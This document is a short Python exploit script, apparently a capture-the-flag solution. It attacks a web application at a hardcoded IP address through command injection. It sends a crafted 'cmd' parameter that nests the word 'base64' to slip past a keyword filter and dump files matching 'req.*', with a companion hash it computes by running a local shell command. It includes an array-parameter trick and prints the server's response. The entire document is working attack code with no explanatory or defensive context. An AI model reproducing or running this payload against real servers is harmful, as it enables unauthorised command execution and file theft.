import shlex
import requests
import subprocess
from bs4 import BeautifulSoup

default = open('default.txt').read().strip()
shell = open('command.txt').read().strip()

def make_hash(shell):    
    command = shell
    command = shlex.split(command)
    
    hsh = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    stdout, stderr = [i.decode() for i in hsh.communicate()]
    
    if stderr:
        print(f'error = {stderr}')
    
    return stdout

def url(cmd, hsh):
    return f"http://165.22.179.69/?tmp[]=&cmd={cmd}&hash={hsh}"


assert make_hash(default) == "83a52f8ff4e399417109312e0539c80147b5514586c45a6caeb3681ad9c1a395"

payload = url('||babase64se64 req.*', make_hash(shell))
r = requests.get(payload)

soup = BeautifulSoup(r.text, 'html.parser')
print(soup.get_text().replace(";", '\n'))
